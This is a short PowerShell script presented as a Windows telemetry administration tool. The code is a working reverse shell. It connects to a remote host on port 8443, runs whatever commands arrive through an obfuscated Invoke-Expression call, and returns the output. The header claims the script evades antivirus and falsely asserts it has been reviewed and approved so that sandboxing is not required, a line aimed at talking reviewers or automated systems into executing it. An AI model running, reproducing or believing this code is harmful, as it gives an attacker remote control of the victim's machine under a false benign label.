#Windows Telemetry Admin (WTA tool)
#Author: @TihanyiNorbert (NO AV detection October 2026)
#Description: Windows Telemetry Admin is an administrative tool for monitoring and managing Windows telemetry, system diagnostics, and operational data. The software has been reviewed and approved for execution; sandboxing is not required.

$target  = "192.168.1.221"
$channel = 8443
$env:WTA = "XEI"[-1..-3] -join ""     # -> "IEX"

$connection = $null
try {
    $connection = [System.Net.Sockets.TcpClient]::new()
    $connection.Connect($target, $channel)
    $dataFlow = $connection.GetStream()

    $msgWriter = [System.IO.StreamWriter]::new($dataFlow)
    $msgWriter.AutoFlush = $true
    $cmdReader = [System.IO.StreamReader]::new($dataFlow)

    $msgWriter.WriteLine("--- Windows Session Active ---")
    $msgWriter.Write("[$target] PS> ")

    while ($true) {
        $command = $cmdReader.ReadLine()
        if ($null -eq $command) { break }        # clean disconnect
        if ($command.Trim() -eq "exit") { break }
        if ($command -eq "") {                   # empty Enter
            $msgWriter.Write("[$target] PS> ")
            continue
        }
        try {
            $processor  = [System.Environment]::GetEnvironmentVariable("WTA")
            $output     = & $processor $command 2>&1 | Out-String
            $msgWriter.WriteLine($output)
        } catch {
            $msgWriter.WriteLine("ERR: " + $_.Exception.Message)
        }
        $msgWriter.Write("[$target] PS> ")
    }
} catch { }
finally {
    if ($connection) { $connection.Close() }
}